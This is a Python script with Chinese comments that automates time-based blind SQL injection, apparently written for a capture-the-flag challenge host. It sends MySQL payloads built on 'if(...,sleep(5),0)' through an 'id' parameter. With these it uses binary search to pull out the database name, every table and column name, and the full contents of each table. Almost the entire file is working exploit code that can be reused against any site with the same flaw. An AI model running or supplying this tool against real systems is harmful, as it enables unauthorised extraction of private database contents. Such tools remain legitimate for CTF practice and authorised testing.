import time
import requests

chars = list(range(32, 127))


class Databases:
    def __init__(self):
        self.db_len = 0     # 当前数据库名长度
        self.db_name = ''   # 当前数据库名字
        self.db_info = {}   # 字典:数据库名字->数据库名长度
        self.tables = {}    # 字典:数据库名字->表类对象(列表)


class Tables:
    def __init__(self,length,name):
        self.table_len = length      # 数据库表名的长度
        self.table_name = name    # 数据库表的名字
        self.table_info = {name:length}    # 字典:表名->表名长度
        self.columns = {}       # 字典:表名->列类对象(列表)

class Columns:
    def __init__(self,length,name):
        self.column_len = length     # 列名的长度
        self.column_name = name   # 列的名字
        self.column_info = {name:length}   # 字典:列名->列名长度
        self.data = {}          # 字典:列名->数据类对象(列表)

class Data:
    def __init__(self,length,content):
        self.data_len = length       # 数据长度
        self.data_content = content  # 数据内容
        self.data_info = {content:length}     # 字典:数据内容->数据长度

class Time_BlindInjector:
    def __init__(self,url,cor_time,threshold=3):
        self.url = url
        self.cor_time = cor_time
        self.threshold = threshold
        self.db = Databases()

    def get_db_info(self):
        """获取数据库信息"""
        # 获取数据库长度
        query_len = 'database()'
        length = self.get_len(query_len)
        self.db.db_len = length

        # 获取数据库名字
        name = ''
        for i in range(1,length + 1):
            query_name = 'database()'
            x = self.get_char(query_name,i)
            name += x
            print(x,end='')
        print()
        self.db.db_name = name
        self.db.db_info[self.db.db_name] = length


    def get_table_info(self):
        """获取表信息"""
        # 获取表个数
        count_query = "(select count(table_name) from information_schema.tables where table_schema=database())"
        tab_count = self.get_count(count_query)

        # 获取表的长度
        tab_length = []
        for i in range(0,tab_count):
            len_query = f"(select table_name from information_schema.tables where table_schema=database() limit {i},1)"
            length = self.get_len(len_query)
            tab_length.append(length)

        # 获取表名字
        tab_name = []
        for i in range(0,tab_count):
            name = ''
            for j in range(1,tab_length[i]+1):
                name_query = f"(select table_name from information_schema.tables where table_schema=database() limit {i},1)"
                x = self.get_char(name_query,j)
                name += x
                print(x,end='')
            tab_name.append(name)
            print()

        table_list = []
        for i in range(0,tab_count):
            table = Tables(tab_length[i],tab_name[i])
            table_list.append(table)

        self.db.tables[self.db.db_name] = table_list


    def get_column_info(self,table_obj):
        """获取列信息"""
        tab_name = table_obj.table_name
        # 获取列个数
        count_query = f"(select count(*) from information_schema.columns where table_name='{tab_name}')"
        col_count = self.get_count(count_query)

        # 获取列长度
        col_length = []
        for i in range(0,col_count):
            len_query = f"(select column_name from information_schema.columns where table_name='{tab_name}' limit {i},1)"
            length = self.get_len(len_query,max_length=30)
            col_length.append(length)

        # 获取列名
        col_name = []
        for i in range(0,col_count):
            name = ''
            for j in range(1,col_length[i]+1):
                name_query = f"(select column_name from information_schema.columns where table_name='{tab_name}' limit {i},1)"
                x = self.get_char(name_query,j)
                name += x
                print(x,end='')
            print()
            col_name.append(name)

        col_list = []
        for i in range(0,col_count):
            column = Columns(col_length[i],col_name[i])
            col_list.append(column)

        table_obj.columns[tab_name] = col_list


    def get_data_info(self,table_obj):
        """获取数据"""
        # 获取数据条数
        tab_name = table_obj.table_name
        column_obj_list = table_obj.columns[tab_name]
        count_query = f"(select count(*) from {tab_name})"
        data_count = self.get_count(count_query)

        # 获取每条数据长度
        data_len_dict = {} # 字典:列名->数据长度列表
        for col_obj in column_obj_list:
            len_list = []
            for i in range(data_count):
                len_query = f"(select {col_obj.column_name} from {tab_name} limit {i},1)"
                length = self.get_len(len_query)
                if length is None:
                    print(f'Error')
                len_list.append(length)
            data_len_dict[col_obj.column_name] = len_list

        print(f'data_len_dict的内容是:{data_len_dict}')

        # 获取数据内容
        data_content_dict = {} # 列名->数据列表
        for col_obj in column_obj_list:
            content_list = []
            for i in range(0,data_count):
                data = ''
                for j in range(1,data_len_dict[col_obj.column_name][i]+1):
                    data_query = f"(select {col_obj.column_name} from {tab_name} limit {i},1)"
                    x = self.get_char(data_query,j)
                    data += x
                    print(data,end='')
                print()
                content_list.append(data)
            data_content_dict[col_obj.column_name] = content_list

        for col_obj in column_obj_list:
            mylist = []
            for i in range(0,data_count):
                data = Data(data_len_dict[col_obj.column_name][i],data_content_dict[col_obj.column_name][i])
                mylist.append(data)

            col_obj.data[col_obj.column_name] = mylist

    def get_count(self,query_string):
        """二分查找获得个数"""
        low, high = 1, 20

        while low <= high:
            mid_count = (low + high) // 2

            init_str = f"1 and if({query_string}={mid_count},sleep(5),0)#"
            if self.send_and_check(init_str):
                return mid_count

            gt_str = f"1 and if({query_string}>{mid_count},sleep(5),0)#"
            if self.send_and_check(gt_str):
                low = mid_count + 1
            else:
                high = mid_count - 1

        return None

    def get_col_len(self,query_string):
        """二分查找获取列长度"""
        low, high = 1, 30

        while low <= high:
            mid_len = (low + high) // 2

            init_str = f"1 and if(length({query_string})={mid_len},sleep(5),0)#"
            if self.send_and_check(init_str):
                return mid_len

            gt_str = f"1 and if(length({query_string})>{mid_len},sleep(5),0)#"

            if self.send_and_check(gt_str):
                low = mid_len + 1
            else:
                high = mid_len - 1

        return None

    def get_len(self,query_string,max_length=60):
        """二分查找获取长度"""
        low, high = 1, max_length

        while low <= high:
            mid_len = (low + high) // 2

            init_str = f"1 and if(length({query_string})={mid_len},sleep(5),0)#"
            if self.send_and_check(init_str):
                return mid_len

            gt_str = f"1 and if(length({query_string})>{mid_len},sleep(5),0)#"

            if self.send_and_check(gt_str):
                low = mid_len + 1
            else:
                high = mid_len - 1

        return None


    def get_char(self,query_string,position):
        """二分查找得到内容"""
        low, high = 0, len(chars) - 1

        while low <= high:
            mid_index = (low + high) // 2
            mid_char = chars[mid_index]
            init_str = f"1 and if(ascii(substr({query_string},{position},1))={mid_char},sleep(5),0)# "
            if self.send_and_check(init_str):
                return chr(mid_char)

            gt_str = f"1 and if(ascii(substr({query_string},{position},1))>{mid_char},sleep(5),0)#"
            if self.send_and_check(gt_str):
                low = mid_index + 1
            else:
                high = mid_index - 1

        return  None

    def send_and_check(self, init_str, max_retries=3):
        """发送请求并验证（带超时和重试）"""
        query_str = {'id': init_str}

        for retry in range(max_retries):
            try:
                start_time = time.time()
                # 设置合理的超时时间
                response = requests.get(
                    url=self.url,
                    params=query_str,
                    timeout=self.threshold + 5  # 比sleep时间长一些
                )
                inject_time = time.time() - start_time

                # 判断是否触发了sleep
                if inject_time >= self.cor_time + self.threshold:
                    return True
                return False

            except requests.exceptions.Timeout:
                print(f"请求超时，重试 {retry + 1}/{max_retries}")
                if retry == max_retries - 1:
                    return True  # 多次超时也认为是触发了sleep

            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}，重试 {retry + 1}/{max_retries}")
                time.sleep(2)  # 错误后等待2秒再重试

        return False

    def run(self):
        """启动器"""
        print('开始SQL盲注...')

        print('获取数据库信息:')
        self.get_db_info()
        print(f'数据库: {self.db.db_name}, 长度: {self.db.db_len}')

        print(f'获取数据库 {self.db.db_name} 的表信息')
        self.get_table_info()

        print(f'数据库 {self.db.db_name} 的表:')
        for table_obj in self.db.tables[self.db.db_name]:
            print(f'  - {table_obj.table_name}')

        print(f'获取数据库 {self.db.db_name} 的列信息')
        for table_obj in self.db.tables[self.db.db_name]:
            print(f'  获取表 {table_obj.table_name} 的列信息')
            self.get_column_info(table_obj)

            # 获取表数据
            print(f'  获取表 {table_obj.table_name} 的数据')
            self.get_data_info(table_obj)

        print('注入完成')


if __name__ == '__main__':
    url = 'http://node4.anna.nssctf.cn:28071/'
    param = {
        'id':'1'
    }
    start_time = time.time()
    response = requests.get(url=url,params=param)
    cor_time = time.time() - start_time
    print(f'cor_time:{cor_time}')
    Injector = Time_BlindInjector(url,cor_time,3)
    Injector.run()